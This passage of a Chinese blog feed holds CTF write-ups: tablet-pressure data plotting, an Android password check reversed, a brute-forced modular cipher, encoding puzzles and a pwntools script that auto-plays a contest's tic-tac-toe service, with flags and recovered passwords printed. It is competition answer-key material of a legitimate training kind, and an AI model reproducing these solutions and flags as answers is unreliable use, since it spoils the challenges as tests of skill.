<span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>

<p><code>gnuplot</code>画图</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-1.png"></p>
<p>得到<code>oursecret</code>密码<code>kfae5y4wi2shwj81y2kda6ax7x</code></p>
<p>解一下<code>oursecret</code>，拿到<code>U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==</code></p>
<p>图片备注中看到<code>糟糕，好像有几个字写的太轻了，看不清楚</code></p>
<p>提取低压感数据，以<code>0xf000</code>作为压感临界值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) &lt; <span class="hljs-number">0xf000</span>:<br>        result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>

<p><code>gnuplot</code>画图</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-2.png"></p>
<p>得到<code>key</code>：<code>w12kax</code></p>
<p>aes解密</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-3.png"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>先安装apk，随意输入一个值，返回<code>error！</code></p>
<p>jadx中搜索关键字，得到判断代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; ccompare = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-built_in">this</span>.compare));<br>Integer[] compare = &#123;<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, IntegvalueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;<br><span class="hljs-type">String</span> <span class="hljs-variable">mname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ccadwjlyah&quot;</span>;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> MainActivity.<span class="hljs-built_in">this</span>.name.getText().toString().trim();<br>    List&lt;Integer&gt; ppwd = MainActivity.change(MainActivity.<span class="hljs-built_in">this</span>.pass.getT().toString().trim());<br>    <span class="hljs-keyword">if</span> (!user.equals(<span class="hljs-built_in">this</span>.mname) || !ppwd.equals(<span class="hljs-built_in">this</span>.ccompare)) &#123;<br>        Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;error！&quot;</span>, <span class="hljs-number">0</span>).show();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;correct！&quot;</span>, <span class="hljs-number">0</span>).show();<br>    MainActivity.<span class="hljs-built_in">this</span>.startActivity(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(MainActivity.<span class="hljs-built_in">this</span>, afterlclass));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>加密函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; <span class="hljs-title function_">change</span><span class="hljs-params">(String args)</span> &#123;<br>    <span class="hljs-type">char</span>[] ch;<br>    List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : args.toCharArray()) &#123;<br>        list.add(Integer.valueOf((c ^ <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用户名明文存储，是<code>ccadwjlyah</code></p>
<p>程序会对输入后的密码加密然后与程序中的<code>compare</code>变量比较</p>
<p>获取<code>compare</code>数组的值，其中有一个成员存储在变量中</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-2.png"></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((i&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>得到密码<code>f4n_4ndro1d</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-1.png"></p>
<p>赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>因为加密代码<code>(str.index(i)*key+7)%37</code>中取余了37，所以key的值可以认为在0~37的范围内</p>
<p>直接爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br>s=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    e=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>            <span class="hljs-keyword">if</span> s[((j*i)+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span>]==a[n]:<br>                e=e+s[j]<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-math-1.png"></p>
<p>flag: <code>799a03b7a82076f5028059681df1b722</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-java</title>
    <url>/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-java.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="79db2cd784dba46c88e58fea849536ed2bcb85afd080df75ba9ff73847c33d30">2cc9a78ceb47e2d606189a59d3ddad6250fcb7ef6e139fa34ed95725c2f187e91c65e7799a0b027509099c7a06fcaf583826c09e314fe0da28218d518a031e710102e78d52d91c859dc208444fbcab5b0c89c11e12ace88366aa06426a1976461a93f6a0ed9f13f64a9aaad5b520051d12299a042c9c96e63c7a60a8bf2c6cd4027dd39cb5920436ad3fbde9c4dd33d54d17abcfa92c9cc53644b3ed581664e09a5dda85a6366cdf7379b9503ace7daa89972646a3a9ff8f6ac407221f0a6715824c4cd21a294d39b4c113c3ea24c0e704fb58c7695fe9cd2de818c46e583baa99d4933998a54fe07b6f4d8509f84309a93c15c9de26e5ecbf020b2622b5b51033129697ae2d76712dadf1738116e4f602ab925f96028c5bee1e82d41035a6faeb90b517c8b368c67f1a2659fe79e72520f5950cc9e57a76c0746cdfac08a9c281ff0e116b29cbdec72a7b870f35014cc5bc1744a1d9419a845107b56ecf680a297f318719261ae3b3231e6c970a24c45f199e6cdb2b3a1139232a3780f5aeb359dd289b16566e8474054cc7e6f62e31</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>ctfshow-web入门</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
        <tag>web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>首届安徽省“追日杯”大学生网络安全挑战赛-wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E9%A6%96%E5%B1%8A%E5%AE%89%E5%BE%BD%E7%9C%81%E2%80%9C%E8%BF%BD%E6%97%A5%E6%9D%AF%E2%80%9D%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9Bwp.html</url>
    <content><![CDATA[<p>混了个三等奖</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>flag{welcome_to_zrb@2021}</p>
<h2 id="阵法的奥秘"><a href="#阵法的奥秘" class="headerlink" title="阵法的奥秘"></a>阵法的奥秘</h2><p>提示是8进制，观察到最后的数字是变化的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">PING zrb.edisec.net: 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.77 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.78 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.83 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.77 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.81 ms<br>64 bytes <span class="hljs-keyword">from</span> zrb.edisec.net: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">time</span>=97.81 ms<br><span class="hljs-built_in">..</span>.<br>略<br></code></pre></td></tr></table></figure>
<p>先提取出来<br>与最小的76取余后转字符串<br>最后两层base64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=[<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">83</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">76</span>,<span class="hljs-number">82</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">82</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">78</span>,<span class="hljs-number">77</span>,<span class="hljs-number">81</span>,<span class="hljs-number">79</span>,<span class="hljs-number">76</span>,<span class="hljs-number">83</span>,<span class="hljs-number">81</span>]<br>d=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=d+<span class="hljs-built_in">str</span>(i%<span class="hljs-number">76</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">3</span>):<br>    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(d[i:i+<span class="hljs-number">3</span>],<span class="hljs-number">8</span>))<br>z=base64.b64decode(e)<br>z=base64.b64decode(z)<br><span class="hljs-built_in">print</span>(z)<br></code></pre></td></tr></table></figure>


<h2 id="偷走的flag"><a href="#偷走的flag" class="headerlink" title="偷走的flag"></a>偷走的flag</h2><p>解压得到<code>这是一个地址.txt</code>和<code>纸条.rar</code></p>
<blockquote>
<p>小明去食堂吃饭，为了能在吃饭的时候有座位，他把自己的耳机和手机充电器放在桌子上。买饭回来后发现自己的东西不见了。以为被收走了。就去失物招领处询问。询问无果后，在QQ空间发现自己被挂了，说自己给学校丢人，用充电器占座，并把充电器放到了指定位置。小明找到以后发现了一串密文，只有解开密文，才能找到充电器的位置。你能帮助小明发现充电器被藏到哪里了吗。<br>密文如下：%E2%A1%96%E2%A1%9C%E2%A1%91%E2%A1%97%E2%A1%8B%E2%A1%B1%E2%A1%83%E2%A0%81%E2%A1%94%E2%A1%95%E2%A1%AF%E2%A1%B6%E2%A1%82%E2%A1%9F%E2%A1%9D%E2%A1%AF%E2%A1%99%E2%A1%9D%E2%A1%80%E2%A1%9C%E2%A1%95%E2%A1%9D%3D</p>
</blockquote>
<p>很明显的url编码，解密后得到<code>⡖⡜⡑⡗⡋⡱⡃⠁⡔⡕⡯⡶⡂⡟⡝⡯⡙⡝⡀⡜⡕⡝=</code><br>盲文编码，<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">在线解密</a>得到<code>flag&#123;As1de_From_implem</code></p>
<p>用这个作为压缩包密码解压</p>
<blockquote>
<p>恭喜你帮助小明找到充电器。但是他的耳机也不见了。通过查询监控发现耳机与充电器一起被拿走了。当他发现耳机时，只剩下一个进水的耳机、一摊水渍和一个被揉搓了好几遍的纸条，上面字迹已经被污染了，但隐约写着：********-I_forg1ve_y0u}。你能帮助小明发现被隐藏的字样吗。</p>
</blockquote>
<p>vim中看到<code>U+202C</code>等字符，为0宽加密<br>解密得到<code>3ntat1on</code></p>
<p>最后拼接在一起，注意别把0宽字符复制进去<br><code>flag&#123;As1de_From_implem3ntat1on-I_forg1ve_y0u&#125;</code></p>
<h2 id="chess"><a href="#chess" class="headerlink" title="chess"></a>chess</h2><p>全自动解密脚本<br>最后一关手动解即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -- coding=utf8 --</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&quot;ctf.zrb.edisec.net&quot;</span>,<span class="hljs-number">33741</span>)<br>win_data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	n=<span class="hljs-number">0</span><br>	l=[[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">3</span><br>	<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;499/500&#x27;</span> <span class="hljs-keyword">in</span> win_data :<br>			p.interactive()<br>		<span class="hljs-keyword">try</span>:<br>			io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">&#x27;2/2&#x27;</span>)<br>			ob=io.recvuntil(<span class="hljs-string">&#x27;computer:&gt;&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>			<span class="hljs-comment">#ob=io.recvuntil(&#x27;player:&gt;&#x27;,timeout=2)</span><br>			<span class="hljs-comment">#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2))</span><br>			<span class="hljs-comment">#ob=io.recvuntil(str(&#x27;player:&gt;&#x27;,timeout=2)).strip()</span><br>			ob=io.recvuntil(<span class="hljs-string">&#x27;player:&gt;&#x27;</span>,timeout=<span class="hljs-number">0.2</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>			ob=ob.strip()<br>			<span class="hljs-comment">#ob=ob.split(&#x27;/n&#x27;)</span><br>			ob=ob.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>			<span class="hljs-comment">#ob=ob.split(&#x27;|&#x27;)</span><br>			ob1=ob[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>			ob2=ob[<span class="hljs-number">4</span>].split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">in</span> ob1[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">in</span> ob2[<span class="hljs-number">2</span>]:<br>				io.send(<span class="hljs-string">b&#x27;1/2\n&#x27;</span>)<br>				io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3/2&#x27;</span>)<br>			<span class="hljs-keyword">else</span>:<br>				io.send(<span class="hljs-string">b&#x27;2/1\n&#x27;</span>)<br>				io.sendlineafter(<span class="hljs-string">&#x27;x/y:&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2/3&#x27;</span>)<br>			<span class="hljs-keyword">try</span>:<br>				ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>				<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>					<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>				win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>			<span class="hljs-keyword">except</span>:<br>				<span class="hljs-keyword">try</span>:<br>					io.send(<span class="hljs-string">b&#x27;1/1\n&#x27;</span>)<br>					ob1=io.recvuntil(<span class="hljs-string">&#x27;repeat&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>					<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob1:<br>						<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>					io.send(<span class="hljs-string">b&#x27;1/3\n&#x27;</span>)<br>					io.sned(<span class="hljs-string">b&#x27;3/1\n&#x27;</span>)<br>				<span class="hljs-keyword">except</span>:<br>					<span class="hljs-keyword">try</span>:<br>						io.send(<span class="hljs-string">b&#x27;3/3\n&#x27;</span>)<br>						ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>						<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>							<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>						win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>					<span class="hljs-keyword">except</span>:<br>						<span class="hljs-comment">#io.interactive()</span><br>						code=<span class="hljs-number">0</span><br>						<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>							<span class="hljs-keyword">if</span> code:<br>								<span class="hljs-keyword">break</span><br>							<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>								<span class="hljs-keyword">try</span>:<br>									io.send(<span class="hljs-string">&#x27;%s/%s\n&#x27;</span>%(i,j))<br>									ob=io.recvuntil(<span class="hljs-string">&#x27;Can you win&#x27;</span>,timeout=<span class="hljs-number">0.2</span>)<br>									<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ob:<br>										<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;123&quot;</span>)<br>									code=<span class="hljs-number">1</span><br>									win_data=io.recvuntil(<span class="hljs-string">&#x27;*****&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>									<span class="hljs-keyword">break</span><br>								<span class="hljs-keyword">except</span>:<br>									<span class="hljs-keyword">pass</span><br>					<span class="hljs-keyword">else</span>:<br>						<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第四层发送2/3，接收win正常&quot;</span>)<br>				<span class="hljs-keyword">else</span>:<br>					<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第三层接收repeat和发送正常&quot;</span>)<br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第二层接收win正常&quot;</span>)<br>		<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;of range&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> e.args[<span class="hljs-number">0</span>]:<br>				io.interactive()<br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功&quot;</span>)<br>	io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/chess.jpg"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="gotofly"><a href="#gotofly" class="headerlink" title="gotofly"></a>gotofly</h2><p>观察重定向<br>看运气出flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/gotofly.jpg"></p>
